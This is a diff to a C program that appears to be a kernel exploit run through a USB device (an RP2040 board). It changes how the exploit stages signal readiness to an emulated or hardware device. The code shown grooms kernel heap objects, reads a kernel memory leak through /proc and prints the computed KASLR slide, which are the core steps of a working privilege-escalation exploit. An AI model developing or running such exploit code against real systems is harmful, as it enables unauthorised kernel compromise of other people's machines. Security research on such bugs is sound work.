@@ -183,14 +183,17 @@ static void print_pointer_candidates(const char *path)
 	}
 }
 
-static void signal_complete(const char *path)
+static void signal_ready(const char *stage)
 {
-	int fd = open(path, O_WRONLY | O_CREAT | O_EXCL, 0600);
+	static const char path[] = "/tmp/kapo-usb-ready";
+	int fd = open(path, O_WRONLY);
 
 	if (fd < 0)
-		fail("create completion marker");
+		fail("open readiness signal");
+	if (dprintf(fd, "%s\n", stage) < 0)
+		fail("write readiness signal");
 	if (close(fd))
-		fail("close completion marker");
+		fail("close readiness signal");
 }
 
 static int open_device(const char *path);
@@ -388,8 +391,10 @@ int main(int argc, char **argv)
 			fprintf(stderr, "disconnect or reset RP2040 before starting hardware mode\n");
 			return EXIT_FAILURE;
 		}
-		groom_helper_page_buffers(helper);
 	}
+	groom_helper_page_buffers(helper);
+	if (!hardware_mode)
+		signal_ready("helper");
 	wait_for_descriptor(descriptors,
 			    DEVICE_DESCRIPTOR_SIZE +
 			    HELPER_CONFIG_COUNT * PIPE_CONFIG_LENGTH, 1);
@@ -400,13 +405,11 @@ int main(int argc, char **argv)
 		fprintf(stderr, "invalid helper page candidate\n");
 		return EXIT_FAILURE;
 	}
-	if (hardware_mode)
-		advance_firmware(device);
-	else
-		signal_complete("/tmp/kapo-helper-complete");
+	advance_firmware(device);
 	wait_for_descriptor(descriptors, 0, 0);
-	if (hardware_mode)
-		groom_seq_operations();
+	groom_seq_operations();
+	if (!hardware_mode)
+		signal_ready("seq");
 	wait_for_descriptor(descriptors,
 			    DEVICE_DESCRIPTOR_SIZE + SEQ_CONFIG_LENGTH, 1);
 	seq_leak = read_proc_leak(descriptors,
@@ -425,11 +428,10 @@ int main(int argc, char **argv)
 		return EXIT_FAILURE;
 	}
 	printf("KASLR_SLIDE=%#llx\n", (unsigned long long)slide);
-	if (hardware_mode)
-		advance_firmware(device);
-	else
-		signal_complete("/tmp/kapo-seq-complete");
+	advance_firmware(device);
 	wait_for_descriptor(descriptors, 0, 0);
+	if (!hardware_mode)
+		signal_ready("stage2");
 	wait_for_descriptor(descriptors,
 			    DEVICE_DESCRIPTOR_SIZE + PIPE_CONFIG_LENGTH, 1);
 
